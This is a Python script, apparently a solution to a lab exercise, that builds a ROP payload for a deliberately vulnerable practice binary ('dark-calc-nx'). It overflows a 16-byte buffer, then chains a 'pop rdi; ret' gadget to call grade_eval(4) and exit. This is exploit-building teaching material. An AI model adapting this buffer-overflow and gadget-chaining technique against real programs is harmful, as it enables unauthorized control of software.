#!/usr/bin/env python3
"""Task 3: ROP —— dark-calc-nx

dark-calc-nx 是 NX（栈不可执行）而且没有 init_fixed_stack()，栈地址随机，
所以不能再往栈上写 shellcode。但它是 -no-pie（代码/数据地址固定），
而且程序里有几个好用的 gadget：

    0x401a33  pop rdi ; ret        （__libc_csu_init 结尾 41 5f c3 的中间字节）
    0x401978  grade_eval
    0x4016e0  exit@plt

x86-64 用寄存器传参，所以先 pop rdi 塞进 4，再返回 grade_eval(4)，
它就会打印 "Hope A will be your grade!"。
"""
import struct
import sys

POP_RDI = 0x401A33
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0

payload = b"A" * 16                             # expression[16]
payload += b"B" * 8                             # saved rbp
payload += struct.pack("<Q", POP_RDI)           # pop rdi ; ret
payload += struct.pack("<Q", 4)                 # rdi = 4
payload += struct.pack("<Q", GRADE_EVAL)        # grade_eval(4)
payload += struct.pack("<Q", EXIT_PLT)          # 打印完干净退出

sys.stdout.buffer.write(payload)
